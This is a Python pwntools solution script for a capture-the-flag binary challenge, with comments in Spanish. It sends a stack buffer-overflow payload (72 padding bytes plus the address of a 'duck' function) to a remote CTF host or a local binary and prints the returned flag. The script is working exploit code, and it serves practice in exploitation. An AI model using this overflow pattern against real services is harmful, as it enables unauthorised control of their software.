#!/usr/bin/env python3
from pwn import *
import time

exe = context.binary = ELF(args.EXE or 'chall')
host = args.HOST or 'chall.v1t.site'
port = int(args.PORT or 30210)

def start():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote(host, port, timeout=10)

duck = exe.symbols.get('duck', 0x40128c)
offset = 72
payload = b"A" * offset + p64(duck)

io = start()

# opcional: leer banner/prompt si lo hay
try:
    banner = io.recvuntil(b": ", timeout=2)   # ajusta si el prompt es distinto
    log.info("Banner/prompt: " + banner.decode(errors='ignore'))
except EOFError:
    log.info("No banner recibido (o EOF)")

# enviar como línea (incluye '\n'), para que fgets/scanf/getline lo procese
io.sendline(payload)

# esperar y leer la respuesta que incluye la FLAG
try:
    out = io.recvuntil(b"\n", timeout=2)  # 1ª línea
    out += io.recvall(timeout=2)          # resto (si hay)
except Exception:
    out = b''
print(out.decode(errors='ignore'))

# pasar a interactivo si quieres una shell (probablemente no haga falta aquí)
io.interactive()
